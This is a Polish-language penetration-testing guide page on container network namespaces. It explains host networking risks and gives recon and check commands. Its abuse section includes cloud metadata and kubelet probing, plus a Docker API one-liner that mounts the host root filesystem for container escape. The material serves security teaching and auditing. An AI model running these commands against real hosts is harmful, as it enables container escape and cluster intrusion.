# Przestrzeń nazw sieciowych

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Przestrzeń nazw sieciowych izoluje zasoby związane z siecią, takie jak interfejsy, adresy IP, tablice routingu, stan ARP/neighbor, reguły firewalla, sockets oraz zawartość plików takich jak `/proc/net`. Dlatego container może mieć coś, co wygląda jak własne `eth0`, własne lokalne trasy oraz własne urządzenie loopback, nie posiadając przy tym rzeczywistego stosu sieciowego hosta.

Z punktu widzenia bezpieczeństwa ma to znaczenie, ponieważ izolacja sieci to znacznie więcej niż jedynie wiązanie portów. Prywatna przestrzeń nazw sieciowych ogranicza to, co workload może bezpośrednio obserwować lub rekonfigurować. Gdy ta przestrzeń nazw zostanie udostępniona hostowi, container może nagle uzyskać widoczność nasłuchów hosta, usług lokalnych hosta oraz punktów sterowania siecią, które nigdy nie miały być eksponowane aplikacji.

## Działanie

Świeżo utworzona przestrzeń nazw sieciowych zaczyna się z pustym lub niemal pustym środowiskiem sieciowym, dopóki nie zostaną do niej podłączone interfejsy. Container runtimes tworzą lub łączą wtedy wirtualne interfejsy, przypisują adresy i konfigurują trasy, aby workload miał oczekiwaną łączność. W wdrożeniach opartych na bridge zazwyczaj oznacza to, że container widzi interfejs veth podłączony do bridge hosta. W Kubernetes pluginy CNI zajmują się równoważną konfiguracją dla sieciowania Podów.

Ta architektura wyjaśnia, dlaczego `--network=host` lub `hostNetwork: true` to tak drastyczna zmiana. Zamiast otrzymać przygotowany prywatny stos sieciowy, workload dołącza do rzeczywistego stosu hosta.

## Laboratorium

Możesz zobaczyć niemal pustą przestrzeń nazw sieciowych za pomocą:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Możesz porównać zwykłe kontenery i kontenery host-networked za pomocą:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontener korzystający z sieci hosta nie ma już własnego, izolowanego widoku gniazd i interfejsów. Sama ta zmiana jest istotna, jeszcze zanim sprawdzisz, jakie uprawnienia ma proces.

## Runtime Usage

Docker i Podman zwykle tworzą prywatną przestrzeń nazw sieci dla każdego kontenera, chyba że skonfigurowano inaczej. Kubernetes zazwyczaj przydziela każdemu Pod własną przestrzeń nazw sieci, współdzieloną przez kontenery w tym Pod, ale oddzieloną od hosta. Incus/LXC również oferują rozbudowaną izolację opartą na network namespace, często z szerszą gamą wirtualnych konfiguracji sieciowych.

Zasadnicza zasada jest taka, że prywatna sieć jest domyślną granicą izolacji, podczas gdy korzystanie z sieci hosta jest wyraźnym zrezygnowaniem z tej granicy.

## Misconfigurations

Najważniejszą błędną konfiguracją jest po prostu udostępnienie przestrzeni nazw sieci hosta. Czasami robi się to dla wydajności, monitoringu niskiego poziomu lub wygody, ale usuwa to jedną z najczystszych granic dostępnych dla kontenerów. Nasłuchujące lokalnie na hoście usługi stają się osiągalne w bardziej bezpośredni sposób, usługi dostępne tylko dla localhost mogą stać się dostępne, a uprawnienia takie jak `CAP_NET_ADMIN` czy `CAP_NET_RAW` stają się znacznie bardziej niebezpieczne, ponieważ operacje, które umożliwiają, są teraz stosowane do sieciowego środowiska samego hosta.

Innym problemem jest nadmierne przyznawanie uprawnień związanych z siecią nawet wtedy, gdy przestrzeń nazw sieci jest prywatna. Prywatna przestrzeń nazw pomaga, ale nie sprawia, że raw sockets ani zaawansowane kontrolowanie sieci stają się nieszkodliwe.

W Kubernetes, `hostNetwork: true` zmienia też stopień, w jakim możesz polegać na segmentacji sieci na poziomie Pod. Kubernetes dokumentuje, że wiele pluginów sieciowych nie potrafi poprawnie odróżnić ruchu Pod z `hostNetwork` dla dopasowań `podSelector` / `namespaceSelector` i w związku z tym traktuje go jak zwykły ruch węzła. Z perspektywy atakującego oznacza to, że skompromitowany workload z `hostNetwork` powinien być często traktowany jako punkt zaczepienia sieciowego na poziomie węzła, a nie jako normalny Pod nadal ograniczony tymi samymi założeniami polityki co workloady w overlay-network.

## Abuse

W słabo izolowanych środowiskach atakujący mogą przeglądać usługi nasłuchujące na hoście, dostać się do punktów zarządzania powiązanych tylko z loopback, podsłuchiwać lub zakłócać ruch w zależności od konkretnych uprawnień i środowiska, albo przekonfigurować routing i stan firewalla, jeśli obecne jest `CAP_NET_ADMIN`. W klastrze może to także ułatwić lateral movement i rozpoznanie control-plane.

Jeśli podejrzewasz korzystanie z sieci hosta, zacznij od potwierdzenia, że widoczne interfejsy i nasłuchujące procesy należą do hosta, a nie do izolowanej sieci kontenera:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Usługi dostępne tylko na loopback często są pierwszym interesującym odkryciem:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Jeśli dostępne są network capabilities, sprawdź, czy workload może przejrzeć lub zmodyfikować widoczny stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Na nowoczesnych jądrach, host networking wraz z `CAP_NET_ADMIN` może także ujawnić ścieżkę pakietów poza prostymi zmianami `iptables` / `nftables`. `tc` qdiscs i filtry są również ograniczone do namespace, więc w współdzielonym host network namespace stosują się do interfejsów hosta, które kontener widzi. Jeśli dodatkowo obecne jest `CAP_BPF`, programy eBPF związane z siecią takie jak TC i XDP loaders również stają się istotne:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
To ma znaczenie, ponieważ atakujący może być w stanie duplikować, przekierowywać, kształtować lub odrzucać ruch na poziomie interfejsu hosta, a nie tylko przepisywać reguły zapory. W prywatnej przestrzeni nazw sieci działania te ograniczają się do widoku kontenera; w współdzielonej przestrzeni nazw hosta mają wpływ na hosta.

W środowiskach klastrowych lub chmurowych sieć hosta również uzasadnia szybkie lokalne recon metadanych i usług powiązanych z control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Pełny przykład: Host Networking + Local Runtime / Kubelet Access

Host networking nie zapewnia automatycznie uprawnień root na hoście, ale często ujawnia usługi, które są celowo dostępne tylko z samego węzła. Jeśli jedna z tych usług jest słabo zabezpieczona, host networking staje się bezpośrednią ścieżką eskalacji uprawnień.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Wpływ:

- bezpośrednie przejęcie hosta, jeśli lokalne runtime API jest wystawione bez odpowiedniej ochrony
- rozpoznanie klastra lub lateral movement, jeśli kubelet lub lokalne agenty są osiągalne
- manipulacja ruchem lub denial of service, gdy połączone z `CAP_NET_ADMIN`

## Checks

Celem tych kontroli jest ustalenie, czy proces ma prywatny stos sieciowy, jakie trasy i nasłuchy są widoczne oraz czy widok sieci już przypomina hosta, zanim jeszcze przetestujesz capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Co jest interesujące tutaj:

- Jeśli `/proc/self/ns/net` i `/proc/1/ns/net` już wyglądają jak na hoście, kontener może dzielić hostową przestrzeń nazw sieciową lub inną przestrzeń nazw, która nie jest prywatna.
- `lsns -t net` i `ip netns identify` są przydatne, gdy shell znajduje się już wewnątrz nazwanego lub trwałego namespace i chcesz skorelować go z obiektami `/run/netns` po stronie hosta.
- `ss -lntup` jest szczególnie wartościowy, ponieważ ujawnia nasłuchy ograniczone do loopback oraz lokalne punkty końcowe zarządzania.
- Trasy, nazwy interfejsów, kontekst firewalla, stan `tc` oraz powiązania eBPF stają się znacznie ważniejsze, jeśli obecne są `CAP_NET_ADMIN`, `CAP_NET_RAW` lub `CAP_BPF`.
- W Kubernetes, nieudane rozwiązywanie nazwy usługi z Poda używającego `hostNetwork` może po prostu oznaczać, że Pod nie używa `dnsPolicy: ClusterFirstWithHostNet`, a nie że usługa jest nieobecna.

Podczas przeglądu kontenera zawsze oceniaj przestrzeń nazw sieciową razem z zestawem uprawnień. Sieć hosta w połączeniu z rozbudowanymi uprawnieniami sieciowymi to zupełnie inna sytuacja niż sieć typu bridge z wąskim domyślnym zestawem uprawnień.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
